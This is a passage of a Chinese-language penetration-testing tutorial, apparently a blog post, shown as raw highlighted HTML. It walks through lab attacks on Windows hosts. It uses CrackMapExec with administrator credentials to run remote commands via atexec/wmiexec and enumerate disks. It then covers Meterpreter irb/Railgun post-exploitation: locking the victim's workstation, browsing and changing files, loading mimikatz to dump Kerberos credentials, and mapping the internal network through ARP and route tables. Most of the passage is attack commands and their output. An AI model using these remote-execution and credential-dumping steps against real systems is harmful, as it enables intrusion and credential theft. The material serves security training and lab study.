SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Executed command via atexec
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220325342.png#pic_center" alt="在这里插入图片描述"><br>
默认采取wmiexec执行Command，参数为-x</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># cme smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> ‐u administrator ‐p <span class="token string">'123456'</span> ‐x <span class="token string">'whoami'</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Windows Web Server <span class="token number">2008</span> R2 <span class="token number">760</span>
<span class="token number">0</span> x64 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WIN‐
<span class="token number">5</span>BMI9HGC42S\administrator<span class="token punctuation">:</span><span class="token number">123456</span> <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Executed command
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S win‐<span class="token number">5</span>bmi9hgc42s\administrator
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220339984.png#pic_center" alt="在这里插入图片描述"><br>
枚举目标机disk</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># cme smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> ‐u administrator ‐p <span class="token string">'123456'</span> ‐‐disks
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Windows Web Server <span class="token number">2008</span> R2 <span class="token number">760</span>
<span class="token number">0</span> x64 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WIN‐
<span class="token number">5</span>BMI9HGC42S\\administrator<span class="token punctuation">:</span><span class="token number">123456</span> <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Enumerated disks
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S C<span class="token punctuation">:</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S D<span class="token punctuation">:</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S E<span class="token punctuation">:</span>
</code></pre>
<p>附录：<br>
解决出现：STATUS_PIPE_DISCONNECTED<br>
​<br>
<img src="https://img-blog.csdnimg.cn/20201008220403936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>改成经典<br>
<img src="https://img-blog.csdnimg.cn/20201008220410256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>解决出现错误：UnicodeDecodeError:</p>
<p>升级impacket</p>
<p><img src="https://img-blog.csdnimg.cn/2020100822042396.png#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="105_meterpreterirbdayuTwentythird_days_3159"></a>10.5 meterpreter下的irb操作（一）（dayu-Twenty-third days）</h2>
<p>Railgun是Meterpreter stdapi的扩展，允许任意加载DLL。Railgun的最大好处是能够动态访问系统上的整个Windows API。通过从用户进程调用Windows API。<br>
<img src="https://img-blog.csdnimg.cn/20201008220604818.png#pic_center" alt="在这里插入图片描述"></p>
<p>meterpreter下执行irb进入ruby交互。<br>
基本的信息搜集：</p>
<pre><code class="prism language-c"><span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>config<span class="token punctuation">.</span>sysinfo<span class="token punctuation">[</span><span class="token string">'OS'</span><span class="token punctuation">]</span>
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">"Windows .NET Server (Build 3790, Service Pack 2)."</span>
<span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>config<span class="token punctuation">.</span>getuid
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">"WIN03X64\\Administrator"</span>
<span class="token operator">&gt;&gt;</span> interfaces <span class="token operator">=</span> client<span class="token punctuation">.</span>net<span class="token punctuation">.</span>config<span class="token punctuation">.</span>interfaces
<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token punctuation">[</span>#<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Interface<span class="token punctuation">:</span><span class="token number">0x000055aee92c5770</span> @index<span class="token operator">=</span><span class="token number">65539</span><span class="token punctuation">,</span> @mac_addr<span class="token operator">=</span><span class="token string">"\x00\f)\x85\xD6}"</span><span class="token punctuation">,</span> @mac_name<span class="token operator">=</span><span class="token string">"Inte l(R) PRO/1000 MT Network Connection"</span><span class="token punctuation">,</span> @mtu<span class="token operator">=</span><span class="token number">1500</span><span class="token punctuation">,</span> @flags<span class="token operator">=</span>nil<span class="token punctuation">,</span> @addrs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"19 2.168.1.119"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> @netmasks<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"255.255.255.0"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> @scopes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> #<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Interface<span class="token punctuation">:</span><span class="token number">0x000055aee92c5220</span> @index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>@mac_addr<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> @mac_name<span class="token operator">=</span><span class="token string">"MS TCP Loopback interface"</span><span class="token punctuation">,</span> @mtu<span class="token operator">=</span><span class="token number">1520</span><span class="token punctuation">,</span> @flags<span class="token operator">=</span>ni l<span class="token punctuation">,</span>@addrs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> @netmasks<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> @scopes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span> interfaces<span class="token punctuation">.</span>each <span class="token keyword">do</span> <span class="token operator">|</span>i<span class="token operator">|</span>
<span class="token operator">?</span><span class="token operator">&gt;</span> puts i<span class="token punctuation">.</span>pretty
<span class="token operator">&gt;&gt;</span> end

Interface <span class="token number">65539</span>
 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Name <span class="token punctuation">:</span> <span class="token function">Intel</span><span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO<span class="token operator">/</span><span class="token number">1000</span> MT Network Connection
Hardware MAC <span class="token punctuation">:</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">85</span><span class="token punctuation">:</span>d6<span class="token punctuation">:</span><span class="token number">7</span>d
MTU <span class="token punctuation">:</span> <span class="token number">1500</span>
IPv4 Address <span class="token punctuation">:</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span>
IPv4 Netmask <span class="token punctuation">:</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span>
Interface <span class="token number">1</span>
 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Name <span class="token punctuation">:</span> MS TCP Loopback interface
Hardware MAC <span class="token punctuation">:</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span>
MTU <span class="token punctuation">:</span> <span class="token number">1520</span>
IPv4 Address <span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>
<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token punctuation">[</span>#<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Interface<span class="token punctuation">:</span><span class="token number">0x000055aee92c5770</span> @index<span class="token operator">=</span><span class="token number">65539</span><span class="token punctuation">,</span> @mac_addr<span class="token operator">=</span><span class="token string">"\x00\f)\x85\xD6}"</span><span class="token punctuation">,</span> @mac_name<span class="token operator">=</span><span class="token string">"Inte l(R) PRO/1000 MT Network Connection"</span><span class="token punctuation">,</span> @mtu<span class="token operator">=</span><span class="token number">1500</span><span class="token punctuation">,</span> @flags<span class="token operator">=</span>nil<span class="token punctuation">,</span> @addrs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"19 2.168.1.119"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> @netmasks<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"255.255.255.0"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> @scopes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> #<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Interface<span class="token punctuation">:</span><span class="token number">0x000055aee92c5220</span> @index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> @mac_addr<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> @mac_name<span class="token operator">=</span><span class="token string">"MS TCP Loopback interface"</span><span class="token punctuation">,</span> @mtu<span class="token operator">=</span><span class="token number">1520</span><span class="token punctuation">,</span> @flags<span class="token operator">=</span>ni l<span class="token punctuation">,</span> @addrs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> @netmasks<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> @scopes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220619325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
锁定注销目标机：</p>
<pre><code class="prism language-c"><span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>railgun<span class="token punctuation">.</span>user32<span class="token punctuation">.</span><span class="token function">LockWorkStation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span><span class="token string">"GetLastError"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"ErrorMessage"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"\xB2\xD9\xD7\xF7\xB3\xC9\xB9\xA6\xCD\xEA\xB3\xC9\xA1\xA3"</span><span class="token punctuation">,</span> <span class="token string">"return"</span><span class="token operator">=</span><span class="token operator">&gt;</span>true<span class="token punctuation">}</span>
<span class="token operator">&gt;&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220633474.png#pic_center" alt="在这里插入图片描述"><br>
调用MessageBox：</p>
<pre><code class="prism language-c"><span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>railgun<span class="token punctuation">.</span>user32<span class="token punctuation">.</span><span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Micropoor"</span><span class="token punctuation">,</span> <span class="token string">"Micropoor"</span><span class="token punctuation">,</span> <span class="token string">"MB_OK"</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220646845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
快速获取当前绝对路径：</p>
<pre><code class="prism language-c"><span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>dir<span class="token punctuation">.</span>pwd
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">"C:\\Documents and Settings\\Administrator\\\xE6\xA1\x8C\xE9\x9D\xA 2"</span>
</code></pre>
<p>目录相关操作：</p>
<pre><code class="prism language-c"><span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>dir<span class="token punctuation">.</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">"c:\\"</span><span class="token punctuation">)</span>
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">0</span>
<span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>dir<span class="token punctuation">.</span>entries
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token string">"ADFS"</span><span class="token punctuation">,</span> <span class="token string">"AUTOEXEC.BAT"</span><span class="token punctuation">,</span> <span class="token string">"boot.ini"</span><span class="token punctuation">,</span> <span class="token string">"bootfont.bin"</span><span class="token punctuation">,</span> <span class="token string">"CONFIG.SYS"</span><span class="token punctuation">,</span> <span class="token string">"Documents and Settings"</span><span class="token punctuation">,</span> <span class="token string">"Inetpub"</span><span class="token punctuation">,</span> <span class="token string">"IO.SYS"</span><span class="token punctuation">,</span> <span class="token string">"MSDOS.SYS"</span><span class="token punctuation">,</span> <span class="token string">"NTDETECT.CO M"</span><span class="token punctuation">,</span> <span class="token string">"ntldr"</span><span class="token punctuation">,</span> <span class="token string">"pagefile.sys"</span><span class="token punctuation">,</span> <span class="token string">"Program Files"</span><span class="token punctuation">,</span> <span class="token string">"Program Files (x86)"</span><span class="token punctuation">,</span> <span class="token string">"RECYCLER"</span><span class="token punctuation">,</span> <span class="token string">"System Volume Information"</span><span class="token punctuation">,</span> <span class="token string">"WINDOWS"</span><span class="token punctuation">,</span> <span class="token string">"wmpub"</span><span class="token punctuation">]</span>
</code></pre>
<p>建立文件夹：</p>
<pre><code class="prism language-c"><span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>dir<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">"Micropoor"</span><span class="token punctuation">)</span>
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">0</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220710183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
hash操作：</p>
<pre><code class="prism language-c"><span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>core<span class="token punctuation">.</span>use <span class="token string">"mimikatz"</span>
<span class="token operator">=</span><span class="token operator">&gt;</span> true
<span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>mimikatz
<span class="token operator">=</span><span class="token operator">&gt;</span> #<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Mimikatz<span class="token punctuation">:</span><span class="token punctuation">:</span>Mimikatz<span class="token punctuation">:</span><span class="token number">0x000055aee91ceb28</span> @client<span class="token operator">=</span>#<span class="token operator">&lt;</span>Session<span class="token punctuation">:</span>meterpreter <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">53</span> <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">)</span> <span class="token string">"WIN03X64\Administrator @ WIN03X64"</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> @name<span class="token operator">=</span><span class="token string">"mimikatz"</span><span class="token operator">&gt;</span>
<span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>mimikatz<span class="token punctuation">.</span>kerberos
<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token punctuation">:</span>authid<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"0;996"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>package<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"Negotiate"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"NETWORKSERVICE"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>domain<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"NT AUTHORITY"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>password<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">:</span>authid<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"0;44482"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>package<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"NTLM"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>domain<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token punctuation">:</span>password<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B \x02 \nn.a. (kerberos KO)"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">:</span>authid<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"0;115231"</span><span class="token punctuation">,</span><span class="token punctuation">:</span>package<span class="token operator">=</span>\<span class="token operator">&gt;</span><span class="token string">"NTLM"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"Administrator"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>domain<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"WIN03X64"</span><span class="token punctuation">,</span><span class="token punctuation">:</span>password<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"mod_process::getVery BasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadPocessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">:</span>a uthid<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"0;997"</span><span class="token punctuation">,</span><span class="token punctuation">:</span>package<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"Negotiate"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"LOCAL SERVICE"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>domain<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"NT AUTHORITY"</span><span class="token punctuation">,</span><span class="token punctuation">:</span>password<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"mod_process::getVeryBasicModulesList ForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">:</span>authid<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"0;999"</span><span class="token punctuation">,</span> package<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"NTLM"</span><span class="token punctuation">,</span>
<span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"WIN03X64$"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>domain<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"WORKGROUP"</span><span class="token punctuation">,</span> <span class="token punctuation">:</span>password<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220724675.png#pic_center" alt="在这里插入图片描述"><br>
内网主机发现，如路由，arp等：</p>
<pre><code class="prism language-c"><span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>net<span class="token punctuation">.</span>config<span class="token punctuation">.</span>arp_table
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">[</span>#<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Arp<span class="token punctuation">:</span><span class="token number">0x000055aee7f5f6b8</span> @ip_addr<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">,</span> @mac_addr<span class="token operator">=</span><span class="token string">"78:44:fd:8e:91:59"</span><span class="token punctuation">,</span> @interface<span class="token operator">=</span><span class="token string">"65539"</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> #<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Arp<span class="token punctuation">:</span><span class="token number">0x000055aee7f5ee20</span> @ip_addr<span class="token operator">=</span><span class="token string">"192.168.1.3"</span><span class="token punctuation">,</span> @mac_addr<span class="token operator">=</span><span class="token string">"28:16:ad:3b:51:78"</span><span class="token punctuation">,</span> @inteface<span class="token operator">=</span><span class="token string">"65539"</span><span class="token operator">&gt;</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>net<span class="token punctuation">.</span>config<span class="token punctuation">.</span>arp_table<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ip_addr
<span class="token operator">&gt;&gt;</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">"192.168.1.1"</span>
<span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>net<span class="token punctuation">.</span>config<span class="token punctuation">.</span>arp_table<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mac_addr
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">"78:44:fd:8e:91:59"</span>
<span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>net<span class="token punctuation">.</span>config<span class="token punctuation">.</span>arp_table<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>interface
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">"65539"</span>
<span class="token operator">&gt;&gt;</span> client<span class="token punctuation">.</span>net<span class="token punctuation">.</span>config<span class="token punctuation">.</span>routes
<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">[</span>#<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>Stdapi<span class="token punctuation">:</span><span class="token punctuation">:</span>Net<span class="token punctuation">:</span><span class="token punctuation">:</span>Route<span class="token punctuation">:</span><span class="token number">0x000055aee789be58</span> @subnet<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> @netmask<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> @gateway<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">,</span>
@interface<span class="token operator">=</span><span class="token string">"65539"</span><span class="token punctuation">,</span> @metric<span class="token operator">=</span><span class="token number">10</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>#<span class="token operator">&lt;</span>Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Post<span class="token punctuation">:</span><span class="token punctuation">:</span>Meterpreter<span class="token punctuation">:</span><span class="token punctuation">:</span>Extensions<span class="token punctuation">:</span><span class="token punctuation">:</span>St
